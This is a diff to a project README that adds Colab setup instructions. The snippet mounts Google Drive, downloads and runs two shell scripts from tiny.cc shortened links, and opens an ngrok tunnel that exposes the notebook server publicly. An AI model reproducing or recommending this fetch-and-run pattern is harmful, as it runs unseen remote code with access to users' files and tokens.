@@ -31,3 +31,27 @@ nbdev_install_git_hooks
 
 * Docs are automatically created from the notebooks in the nbs folder.
 
+## Note for COLAB users
+The best experience for colab users will be gotten using Juyter Notebooks on colab. This can be simply set up by doing
+```
+from google.colab import drive
+drive.mount('/content/drive')
+
+import subprocess
+def run_inf_loop():
+    while True: ...
+    
+def setup_colab(tok):
+  subprocess.call(['wget', 'http://tiny.cc/80jwlz', '-O', 'bash.sh'])
+  subprocess.call(['sh', 'bash.sh'])
+  get_ipython().system_raw(f'./ngrok authtoken {tok} && ./ngrok http --log=stdout 8888 > ngrok.log &')
+  !pip install nbdev -q
+  !curl -s http://localhost:4040/api/tunnels | python3 -c "import sys, json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])"
+  subprocess.call(['wget', 'http://tiny.cc/qrjwlz', '-O', 'bash2.sh'])
+  subprocess.call(['sh', 'bash2.sh'])
+  run_inf_loop()
+  
+setup_colab(<ngrok_auth_token>)
+```
+
+After this open up the link that is shown and then you can start working in a Jupyter Notebook using a Google Colab backend!
